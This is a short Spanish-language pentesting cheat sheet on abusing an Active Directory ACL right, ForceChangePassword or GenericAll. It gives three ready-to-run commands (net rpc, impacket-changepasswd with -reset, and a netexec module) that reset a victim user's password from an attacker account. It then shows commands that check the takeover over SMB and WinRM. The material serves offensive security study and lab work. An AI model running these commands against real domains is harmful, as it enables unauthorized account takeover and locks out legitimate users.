# Abuso ACL 

Tags: #Linux #ForceChangePassword #AD #ACL #Net 

## ForceChangePassword sobre Usuario 

```bash 
Paso 1:
❯ net rpc password 'TargetUser' 'NewPass123!' -U domain.corp/user%'passwd' -S IP_DC
# Cambia la contraseña sin conocer la actual
	# TargetUser     = Usuario víctima (el que quieres cambiar)
	# NewPass123!    = Nueva contraseña que le pones a la víctima
	# user%passwd    = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# IP_DC          = IP del Domain Controller

Opción 2 - Más limpio que net rpc en entornos modernos
❯ impacket-changepasswd 'domain.corp/user@IP_DC' -altuser user -altpass 'NewPass123!' -newpass 'NewPass123!' -reset -dc-ip IP_DC

	# TargetUser@IP_DC = Usuario víctima (el que quieres cambiar)
	# altuser          = Usuario atacante (quien tiene GenericAll / ForceChangePassword)
	# altpass          = Contraseña del usuario atacante
	# newpass          = Nueva contraseña para la víctima
	# -reset           = Fuerza el cambio sin conocer la contraseña actual
	# dc-ip            = IP del Domain Controller

Opción 3 - Alternativa con netexec
❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change-password -o USER=targetuser NEWPASS='NewPass123!'

	# IP_DC           = IP del Domain Controller
	# user / passwd   = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# USER=TargetUser = Usuario víctima (el que quieres cambiar)
	# NEWPASS         = Nueva contraseña para la víctima
```

```bash 
Paso 2:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u "TargetUser" -p "NewPass123!" 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u "TargetUser" -p "NewPass123!" 
```